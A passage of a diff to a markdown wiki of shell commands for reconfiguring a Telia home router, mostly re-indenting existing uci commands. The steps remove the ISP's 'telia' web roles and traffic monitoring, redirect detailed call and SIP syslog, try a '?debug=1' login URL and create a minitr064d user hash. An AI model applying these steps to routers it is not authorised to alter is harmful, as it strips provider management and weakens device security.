+    IP address     HW type    Flags     HW address      Mask    Device
+    lanip      0x1     0x2     X0:X0:X0:X0:X0:X0    *    br-lan
+    mgmt_ip     0x1     0x2     X0:X0:X0:X0:X0:X0    *    vlan_mgmt
+    wanip      0x1     0x2     X0:X0:X0:X0:X0:X0    *    eth4
+    
 ##### List all interfaces mac-addresses
 
     ifconfig -a  | sed '/eth\|wl/!d;s/ Link.*HWaddr//'
-    eth0      X0:X0:X0:X0:X0:X0  
-    eth1      X0:X0:X0:X0:X0:X0 
-    eth2      X0:X0:X0:X0:X0:X0  
-    eth3      X0:X0:X0:X0:X0:X0 
-    eth4      X0:X0:X0:X0:X0:X0 
-    eth5      X0:X0:X0:X0:X0:X0 
+    eth0    X0:X0:X0:X0:X0:X0  
+    eth1    X0:X0:X0:X0:X0:X0 
+    eth2    X0:X0:X0:X0:X0:X0  
+    eth3    X0:X0:X0:X0:X0:X0 
+    eth4    X0:X0:X0:X0:X0:X0 
+    eth5    X0:X0:X0:X0:X0:X0 
     vlan_eth0 X0:X0:X0:X0:X0:X0 
     vlan_eth1 X0:X0:X0:X0:X0:X0  
     vlan_eth2 X0:X0:X0:X0:X0:X0   
     vlan_eth3 X0:X0:X0:X0:X0:X0  
     vlan_eth5 X0:X0:X0:X0:X0:X0 
-    wl0       X0:X0:X0:X0:X0:X0 
-    wl0_1     X0:X0:X0:X0:X0:X0   
-    wl0_2     X0:X0:X0:X0:X0:X0  
+    wl0     X0:X0:X0:X0:X0:X0 
+    wl0_1    X0:X0:X0:X0:X0:X0   
+    wl0_2    X0:X0:X0:X0:X0:X0  
    
 ##### Remove trafficmon settings:
 
-     uci delete system.@trafficmon[0].interface=''
-     uci delete system.@trafficmon[0].minute=''
-     uci delete system.@trafficmon[1].interface=''
-     uci delete system.@trafficmon[1].minute=''
-     uci delete system.@trafficmon[2].interface=''
-     uci delete system.@trafficmon[2].minute=''
-     uci delete system.@trafficmon[3]=trafficmon
-     uci delete system.@trafficmon[3].interface=''
-     uci delete system.@trafficmon[3].minute=''
-     uci delete web.trafficmonitor=rule
-     uci delete web.ruleset_main.rules='gateway'
-     uci delete web.trafficmonitor.target='/modals/traffic-monitor.lp'
-     uci delete web.trafficmonitor.roles='admin'
+    uci delete system.@trafficmon[0].interface=''
+    uci delete system.@trafficmon[0].minute=''
+    uci delete system.@trafficmon[1].interface=''
+    uci delete system.@trafficmon[1].minute=''
+    uci delete system.@trafficmon[2].interface=''
+    uci delete system.@trafficmon[2].minute=''
+    uci delete system.@trafficmon[3]=trafficmon
+    uci delete system.@trafficmon[3].interface=''
+    uci delete system.@trafficmon[3].minute=''
+    uci delete web.trafficmonitor=rule
+    uci delete web.ruleset_main.rules='gateway'
+    uci delete web.trafficmonitor.target='/modals/traffic-monitor.lp'
+    uci delete web.trafficmonitor.roles='admin'
 
 ##### Send syslog to your own server instead of sending * to Telia (it's insane that they want all stuff they filtering as default)
 
-     uci set ledfw.syslog=syslog
-     uci set ledfw.syslog.trace='6'
-     uci set mmpbx.syslog=syslog
-     uci set mmpbx.syslog.service_config='1'
-     uci set mmpbx.syslog.service_actions='1'
-     uci set mmpbx.syslog.calls='1'
-     uci set mmpbx.syslog.syslog_priority='6'
-     uci set mmpbx.syslog.hide_user_identity='0'
-     uci set mmpbxbrcmdectdev.syslog=syslog
-     uci set mmpbxbrcmdectdev.syslog.phone='1'
-     uci set mmpbxbrcmdectdev.syslog.syslog_priority='6'
-     uci set mmpbxbrcmdectdev.syslog.syslog_hide_dialled_digits='1'
-     uci set mmpbxbrcmfxsdev.syslog=syslog
-     uci set mmpbxbrcmfxsdev.syslog.phone='1'
-     uci set mmpbxbrcmfxsdev.syslog.syslog_priority='6'
-     uci set mmpbxbrcmfxsdev.syslog.syslog_hide_dialled_digits='1'
-     uci set mmpbxrvsipnet.syslog=syslog
-     uci set mmpbxrvsipnet.syslog.registration='1'
-     uci set mmpbxrvsipnet.syslog.call_signalling='1'
-     uci set mmpbxrvsipnet.syslog.syslog_priority='6'
-     uci set mmpbxrvsipnet.syslog.log_sip_message='1'
-     uci set mmpbxrvsipnet.syslog.hide_user_identity='0'
-     uci set osgi.config.enable_syslog='1'
-     uci set siege.log.enable_syslog='1'
-     uci del_list web_back.syslogmodal.roles='telia'
-     
+    uci set ledfw.syslog=syslog
+    uci set ledfw.syslog.trace='6'
+    uci set mmpbx.syslog=syslog
+    uci set mmpbx.syslog.service_config='1'
+    uci set mmpbx.syslog.service_actions='1'
+    uci set mmpbx.syslog.calls='1'
+    uci set mmpbx.syslog.syslog_priority='6'
+    uci set mmpbx.syslog.hide_user_identity='0'
+    uci set mmpbxbrcmdectdev.syslog=syslog
+    uci set mmpbxbrcmdectdev.syslog.phone='1'
+    uci set mmpbxbrcmdectdev.syslog.syslog_priority='6'
+    uci set mmpbxbrcmdectdev.syslog.syslog_hide_dialled_digits='1'
+    uci set mmpbxbrcmfxsdev.syslog=syslog
+    uci set mmpbxbrcmfxsdev.syslog.phone='1'
+    uci set mmpbxbrcmfxsdev.syslog.syslog_priority='6'
+    uci set mmpbxbrcmfxsdev.syslog.syslog_hide_dialled_digits='1'
+    uci set mmpbxrvsipnet.syslog=syslog
+    uci set mmpbxrvsipnet.syslog.registration='1'
+    uci set mmpbxrvsipnet.syslog.call_signalling='1'
+    uci set mmpbxrvsipnet.syslog.syslog_priority='6'
+    uci set mmpbxrvsipnet.syslog.log_sip_message='1'
+    uci set mmpbxrvsipnet.syslog.hide_user_identity='0'
+    uci set osgi.config.enable_syslog='1'
+    uci set siege.log.enable_syslog='1'
+    uci del_list web_back.syslogmodal.roles='telia'
+    
 ##### Disable Time of Day ACL rules
 
-     uci set tod.global.enabled='0'
-      
+    uci set tod.global.enabled='0'
+    
 ##### For login with debug mode enabled, then please go to (Proably not possible but it is to try):
-     
-     http://192.168.1.1/?debug=1
-     
+    
+    http://192.168.1.1/?debug=1
+    
 ##### Disable so your router wont restart if there is an segmentation fault in a user space program.
 
     uci set system.@coredump[0].reboot='0'
@@ -850,18 +912,18 @@ restore the router, what are they doing with this data? This is really unpleasan
     
 ##### Enable or Disable WWAN support (mobiled)
 
-     uci set mobiled.globals.enabled='1'
-     uci set mobiled.device_defaults.enabled='1'
+    uci set mobiled.globals.enabled='1'
+    uci set mobiled.device_defaults.enabled='1'
     
 ##### Enable or Disable Content Sharing (Samba / DNLA)
 
-     uci set samba.samba.enabled='1'
-     uci set dlnad.config.enabled='1'
-     
+    uci set samba.samba.enabled='1'
+    uci set dlnad.config.enabled='1'
+    
 ##### To view currently dhcp leases:
 
-     cat /tmp/dhcp.leases
-     1534969000 macaddr lanip machine macaddr
+    cat /tmp/dhcp.leases
+    1534969000 macaddr lanip machine macaddr
     
 ##### Enable or Disable TFTP:
 
@@ -912,10 +974,20 @@ restore the router, what are they doing with this data? This is really unpleasan
     uci delete web_back.mmpbxservicemodal.roles='telia' 
     uci delete web_back.mmpbxdectmodal.roles='telia' 
 
+##### Create a user for minitrr064d 
+   
+    computeHA1 -u <username> -p <password>
+    Self test passed - HA1 computation reliable
+    Self test passed - authentication check reliable
+    
+    Computing hash for <username>:minitr064d:<password>
+    e2fFYafa89fa7fya98f
+
+
 ##### Disable Time of Day ACL rules
 
-     uci set tod.global.enabled='0'
-     
+    uci set tod.global.enabled='0'
+    
 ##### List installed packages:
 
     echo $(opkg list_installed | awk '{ print $1 }') 
@@ -923,7 +995,7 @@ restore the router, what are they doing with this data? This is really unpleasan
 ##### List installed packages in a tree:
 
     echo $(opkg list_installed | awk '{ print $1 }') | xargs -n 1
-       
+     
 ### Have fun and be careful with other settings not provided by me! ;)
 
 #### THIS WIKI IS LICENSED UNDER MIT
@@ -931,14 +1003,14 @@ restore the router, what are they doing with this data? This is really unpleasan
 
 # CONTACT
 
-     If you have problems, questions, ideas or suggestions please contact
-     us by posting to info@sendit.nu
+    If you have problems, questions, ideas or suggestions please contact
+    us by posting to info@sendit.nu
 
 # WEB SITE
 
-     Visit our homepage for the latest info and updated tools
+    Visit our homepage for the latest info and updated tools
 
-     https://sendit.nu & https://github.com/wuseman/
+    https://sendit.nu & https://github.com/wuseman/
 
 ### END!
 
